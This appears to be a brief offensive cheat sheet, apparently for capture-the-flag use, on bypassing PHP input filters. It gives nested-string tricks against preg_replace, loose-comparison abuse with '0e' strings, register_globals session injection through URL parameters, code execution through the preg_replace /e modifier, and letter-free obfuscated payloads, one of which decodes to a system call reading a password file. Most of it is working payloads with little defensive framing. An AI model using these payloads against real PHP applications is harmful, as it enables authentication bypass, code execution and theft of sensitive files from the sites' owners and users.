# PHP Filter Bypass

## preg_replace('search','replacewith','stringtovalidate')
```php
$variable = preg_replace('foxchallenge','','foxchallfoxchallengeenge')
```
Note that the string in the middle is checked and deleted but as it is wrapped with another foxchallenge, the second isnt checked

## Double comparison
In php, when comparing with `==`, types are converted to integers before comparison. And string which start with `0e` are interpreted as `0`

## Register globals turned ON
Patched in php 5.3.0  

A variable that is not set before use can be set from super globals such as `$_REQUEST`,`$_POST`,`$_COOKIES` or `$_GET`, `$_SESSION`, `$_SERVER`. The fact is that if the variable is not set where the code looks for, it look in global variables.

Example : 
```php
if (authenticated_user()) {
	$authorized = true;
}
// Insecure using of $authorized because no default value has been set
if ($authorized) {
	include "/highly/sensitive/data.php";
}
```

Global variables can be modify thru request params : 
```
_METHOD[param]=value
```
Example with logged param :
```
http://example.com/index.php?_SESSION[logged]=1
```

## preg_replace()

preg_replace is vulnerable to rce : 

```php
preg_replace("Replace that", "with that", "from that")
preg_replace("/a/e",phpinfo(),"whatever")
preg_replace("/a/e",file_get_contents("./index.php"),"whatever")
```


## No letters

### Using XOR technics
Concatenate letter by letter
```php
('('^'[') . ('$'^']') ...
```

### Using octal
```php
("\160\150\160\151\156\146\157")() // ("phpinfo")() = phpinfo()
("\163\171\163\164\145\155")("\143\141\164\40\56\160\141\163\163\167\144") // ("system")("cat .passwd")
```